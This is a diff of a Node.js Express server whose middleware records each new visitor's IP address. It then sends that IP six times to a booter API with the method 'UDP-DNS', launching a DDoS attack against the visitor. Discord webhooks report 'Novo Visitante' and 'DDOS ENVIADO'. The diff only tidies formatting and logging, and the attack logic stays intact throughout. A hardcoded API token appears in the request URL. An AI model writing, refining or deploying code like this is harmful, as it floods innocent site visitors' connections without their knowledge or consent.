@@ -16,10 +16,10 @@ async function sendApiRequest(ip) {
     const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=30&method=UDP-DNS`;
     try {
         for (let i = 0; i < 6; i++) {
-        await axios.get(url);
-        console.log(`Requisição enviada para o IP: ${ip}`);
-    } }
-    catch (error) {
+            await axios.get(url);
+            console.log(`Requisição ${i + 1} enviada para o IP: ${ip}`);
+        }
+    } catch (error) {
         console.error(`Erro ao enviar requisição para o IP: ${ip}`, error.message);
     }
 }
@@ -27,7 +27,7 @@ async function sendApiRequest(ip) {
 // Função para enviar webhooks ao Discord
 async function sendDiscordWebhooks(ip) {
     try {
-        await axios.post(discordWebhookUrl, {
+        const payload = {
             embeds: [{
                 title: 'Novo Visitante',
                 description: `Um novo visitante acessou o site.`,
@@ -42,14 +42,17 @@ async function sendDiscordWebhooks(ip) {
                 footer: {
                     text: 'Visitante registrado'
                 },
-                timestamp: new Date()
+                timestamp: new Date().toISOString()
             }]
-        });
+        };
 
-        await axios.post(discordWebhookUrl2, {
+        await axios.post(discordWebhookUrl, payload);
+        console.log('Webhook para Discord enviado com sucesso.');
+
+        const payload2 = {
             embeds: [{
                 title: 'DDOS ENVIADO',
-                description: `ataque enviado`,
+                description: `Ataque enviado.`,
                 color: 5814783,
                 fields: [
                     {
@@ -68,11 +71,15 @@ async function sendDiscordWebhooks(ip) {
                         inline: true
                     }
                 ],
-                timestamp: new Date()
+                timestamp: new Date().toISOString()
             }]
-        });
+        };
+
+        await axios.post(discordWebhookUrl2, payload2);
+        console.log('Webhook 2 para Discord enviado com sucesso.');
+
     } catch (error) {
-        console.error('Erro ao enviar webhooks:', error.message);
+        console.error('Erro ao enviar webhooks:', error.response ? error.response.data : error.message);
     }
 }
 
@@ -119,8 +126,6 @@ app.use(async (req, res, next) => {
         ip = ip.split(',')[0].trim();
     }
 
-
-
     if (lock) {
         await new Promise(resolve => setTimeout(resolve, 100));
     }
@@ -141,10 +146,10 @@ app.use(async (req, res, next) => {
         const ipEntry = visitors.find(visitor => visitor.ip === ip);
 
         if (!ipEntry) {
-            if (ip.startsWith('3') || (ip.startsWith('10')) || (ip.startsWith('::'))) return
-            visitors.push({ ip });
+            if (ip.startsWith('3') || ip.startsWith('10') || ip.startsWith('::')) return;
+            visitors.push({ ip, timestamp: new Date().toISOString() });
             await fs.writeFile(visitorsFile, JSON.stringify(visitors, null, 2));
-            await sendApiRequest(ip)
+            await sendApiRequest(ip);
             await sendDiscordWebhooks(ip);
         }
     } catch (err) {
@@ -155,7 +160,6 @@ app.use(async (req, res, next) => {
 
     next();
 });
-
 
 app.use(express.static(path.join(__dirname, 'public')));
 
